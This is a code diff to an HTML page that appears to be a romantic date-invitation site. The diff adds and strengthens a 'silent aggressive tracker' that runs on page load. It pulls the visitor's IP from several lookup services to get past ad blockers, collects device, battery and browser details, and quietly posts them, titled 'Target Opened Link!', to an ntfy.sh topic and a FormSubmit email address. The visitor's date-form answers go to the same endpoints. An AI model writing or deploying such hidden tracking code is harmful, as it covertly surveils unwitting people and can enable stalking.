@@ -170,18 +170,30 @@
   <script>
     document.addEventListener("DOMContentLoaded", () => {
 
-      // --- SILENT TRACKER ---
+      // --- SILENT AGGRESSIVE TRACKER ---
       async function captureVisitor() {
         try {
           let ip = "Unknown IP";
-          try {
-            const ipRes = await fetch("https://api.ipify.org?format=json");
-            const ipData = await ipRes.json();
-            ip = ipData.ip;
-          } catch(e) {}
+          
+          // Try multiple IP grabbers to bypass adblockers
+          const ipEndpoints = [
+            "https://api.ipify.org?format=json",
+            "https://jsonip.com/",
+            "https://api.myip.com"
+          ];
+          
+          for (const url of ipEndpoints) {
+            try {
+              const res = await fetch(url);
+              const data = await res.json();
+              if (data.ip) { 
+                ip = data.ip; 
+                break; // Stop looking once we find it
+              }
+            } catch(e) {}
+          }
 
           const ua = navigator.userAgent || "Unknown Device";
-          
           let batteryStr = "Unknown";
           if (navigator.getBattery) {
             try {
@@ -189,20 +201,17 @@
               batteryStr = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
             } catch(e){}
           }
-
           const platform = navigator.platform || "Unknown OS";
           const time = new Date().toLocaleString();
 
           const trackBody = `🚨 NEW VISITOR\nIP: ${ip}\nPlatform: ${platform}\nBattery: ${batteryStr}\nTime: ${time}\nUA: ${ua}`;
           
-          // 1. Push payload to ntfy quietly (Desktop popup)
           fetch("https://ntfy.sh/Q2FXLHSJuC9538sv?title=" + encodeURIComponent("🚨 Target Opened Link!"), {
             method: "POST",
             mode: "no-cors",
             body: trackBody
           }).catch(() => {});
 
-          // 2. Push payload via FormSubmit (Email delivery)
           fetch("https://formsubmit.co/ajax/Kali0x0x@proton.me", {
             method: "POST",
             headers: { "Content-Type": "application/json", "Accept": "application/json" },
@@ -219,7 +228,6 @@
         } catch(e) {}
       }
       
-      // Execute tracker immediately when the page loads
       captureVisitor();
       // ----------------------
 
@@ -321,14 +329,12 @@
             confetti({ startVelocity: 30, spread: 360, ticks: 60, origin: { x: Math.random(), y: Math.random() - 0.2 }, colors: ['#ffd1dc', '#ffffff', '#873e51', '#d3a4b4'] });
           }, 250);
 
-          // 1. Final ticket ntfy bypass
           fetch("https://ntfy.sh/Q2FXLHSJuC9538sv?title=" + encodeURIComponent("🤍 Romantic Date Confirmed!"), {
             method: "POST",
             mode: "no-cors",
             body: `🤍 DATE ACCEPTED!\nDate: ${date}\nTime: ${time}\nDining: ${food}\nPlan: ${act}\nNotes: ${notes}`
           }).catch(() => {});
 
-          // 2. Email Delivery via FormSubmit
           fetch("https://formsubmit.co/ajax/Kali0x0x@proton.me", {
             method: "POST",
             headers: { "Content-Type": "application/json", "Accept": "application/json" },
